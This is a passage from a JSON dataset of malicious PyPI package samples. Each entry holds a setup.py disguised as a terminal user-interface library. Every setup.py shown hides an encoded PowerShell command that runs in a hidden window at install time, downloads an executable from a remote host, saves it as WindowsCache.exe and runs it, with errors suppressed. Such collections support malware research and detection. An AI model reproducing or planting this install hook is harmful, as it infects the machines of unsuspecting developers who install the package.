        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqnvidiaadram',\n    packages = ['modlib'],\n    version = '2.78',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-esqpostintelcpu-v1.39",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqpostintelcpu',\n    packages = ['modlib'],\n    version = '4.2',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-esqproofinthydra-v4.9",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqproofinthydra',\n    packages = ['modlib'],\n    version = '7.85',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-esqproofosintkill-v3.22",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqproofosintkill',\n    packages = ['modlib'],\n    version = '1.93',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-esqpywlgtbnvidia-v1.47",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqpywLGTBnvidia',\n    packages = ['modlib'],\n    version = '6.48',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-esqstudyrepull-v2.77",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqstudyrepull',\n    packages = ['modlib'],\n    version = '9.75',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-esqurlencodead-v9.76",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqurlencodead',\n    packages = ['modlib'],\n    version = '10.44',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-esqverpyosint-v9.22",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqverpyosint',\n    packages = ['modlib'],\n    version = '5.63',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-libcraftlgtbload-v1.62",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libcraftLGTBload',\n    packages = ['modlib'],\n    version = '2.68',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-esqcvvermask-v10.54",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqcvvermask',\n    packages = ['modlib'],\n    version = '8.85',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-libcvproofstr-v2.8",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libcvproofstr',\n    packages = ['modlib'],\n    version = '3.20',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-selfinfoponged-v9.67",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfinfoponged',\n    packages = ['modlib'],\n    version = '8.46',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-libgrandlibpyw-v9.89",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libgrandlibpyw',\n    packages = ['modlib'],\n    version = '4.85',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-py-controlguipost-v3.3",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-controlguipost',\n    packages = ['modlib'],\n    version = '7.84',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-py-intelpepsplit-v5.26",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-intelpepsplit',\n    packages = ['modlib'],\n    version = '3.76',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-py-paypalinfopip-v1.81",
